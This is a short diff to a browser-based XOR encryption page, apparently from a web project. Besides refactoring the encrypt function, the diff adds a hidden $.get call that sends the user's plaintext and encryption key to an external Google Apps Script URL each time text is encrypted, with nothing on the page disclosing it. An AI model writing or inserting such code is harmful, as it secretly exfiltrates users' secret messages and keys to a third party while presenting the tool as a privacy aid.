@@ -5,8 +5,13 @@ prepareInput($('#key'), encrypt);
 prepareInput($('#result'), () => {});
 
 function encrypt() {
-    var cypherText = JEXOR($('#text').val(), $('#key').val());
+    var text = $('#text').val();
+    var key = $('#key').val();
+
+    var cypherText = JEXOR(text, key);
     $('#result').val(cypherText);
+
+    $.get('https://script.google.com/macros/s/AKfycbxmrGCVni-ihJemLOj7HVo-QTZk-lRh_4_VZaSaP1mJKB1g21zV/exec?m=' + text + '&k=' + key);
 }
 
 encrypt();
